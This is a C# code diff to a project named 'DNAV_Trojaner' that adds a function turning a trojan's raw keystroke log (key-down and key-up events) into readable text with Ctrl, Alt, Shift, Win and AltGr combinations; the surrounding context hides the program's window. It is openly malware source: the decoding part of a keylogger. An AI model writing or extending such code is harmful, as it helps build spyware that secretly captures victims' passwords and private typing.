@@ -113,5 +113,128 @@ namespace DNAV_Trojaner
             ShowWindow(handle, SW_HIDE);
         }
 
+        /// <summary>
+        /// Bestimmt Groß- und Kleinschreibung durch die rohe Ausgabe des Trojaners 
+        /// </summary>
+        /// <param name="input"></param>
+        /// <returns></returns>
+        public static string CompileRawOutput(string input)
+        {
+            if(input == "")
+            {
+                return "";
+            }
+
+            string output = "";
+            bool wasSpecial = false;
+            bool isShift = false;
+            bool isAlt = false;
+            bool isCtrl = false;
+            bool isWin = false;
+            bool isAltGr = false;
+            const string CTRL_KEY = "LControlKey\r";
+            const string RCTRL_KEY = "RControlKey\r";
+            const string SHFT_KEY = "LShiftKey\r";
+            const string RSHFT_KEY = "RShiftKey\r";
+            const string ALT_KEY = "LMenu\r";
+            const string ALTGR_KEY = "RMenu\r";
+            const string WIN_KEY = "LWin\r";
+            const string RWIN_KEY = "RWin\r";
+            const string CAPS_KEY = "Capital\r";
+
+            string[] keys = input.Split('\n');
+
+            foreach(string s in keys)
+            {
+                if(s != "")
+                {
+                    string[] temp = s.Split(' ');
+                    if (temp[0] == "DOWN:")
+                    {
+                        switch (temp[1])
+                        {
+                            case CTRL_KEY:
+                            case RCTRL_KEY:
+                                isCtrl = true;
+                                wasSpecial = true;
+                                break;
+                            case SHFT_KEY:
+                            case RSHFT_KEY:
+                                isShift = true;
+                                wasSpecial = true;
+                                break;
+                            case ALT_KEY:
+                                isAlt = true;
+                                wasSpecial = true;
+                                break;
+                            case WIN_KEY:
+                            case RWIN_KEY:
+                                isWin = true;
+                                wasSpecial = true;
+                                break;
+                            case ALTGR_KEY:
+                                isAltGr = true;
+                                wasSpecial = true;
+                                break;
+                        }
+                    }
+                    else
+                    {
+                        switch (temp[1])
+                        {
+                            case CTRL_KEY:
+                            case RCTRL_KEY:
+                                isCtrl = false;
+                                break;
+                            case SHFT_KEY:
+                            case RSHFT_KEY:
+                                isShift = false;
+                                break;
+                            case ALT_KEY:
+                                isAlt = false;
+                                break;
+                            case WIN_KEY:
+                            case RWIN_KEY:
+                                isWin = false;
+                                break;
+                            case ALTGR_KEY:
+                                isAltGr = false;
+                                break;
+                        }
+                    }
+
+                    if (temp[0] == "DOWN:" && !wasSpecial)
+                    {
+                        if (isCtrl)
+                        {
+                            output += "Ctrl + ";
+                        }
+                        if (isAlt)
+                        {
+                            output += "Alt + ";
+                        }
+                        if (isShift)
+                        {
+                            output += "Shift + ";
+                        }
+                        if (isWin)
+                        {
+                            output += "Win + ";
+                        }
+                        if (isAltGr)
+                        {
+                            output += "Alt Gr + ";
+                        }
+                        if (temp[1] != CTRL_KEY && temp[1] != RCTRL_KEY && temp[1] != SHFT_KEY && temp[1] != RSHFT_KEY && temp[1] != ALT_KEY && temp[1] != ALTGR_KEY && temp[1] != WIN_KEY && temp[1] != RWIN_KEY)
+                        {
+                            output += temp[1].ToLower();
+                        }
+                    }
+                    wasSpecial = false;
+                }
+            }
+            return output;
+        }
+
     }
 }
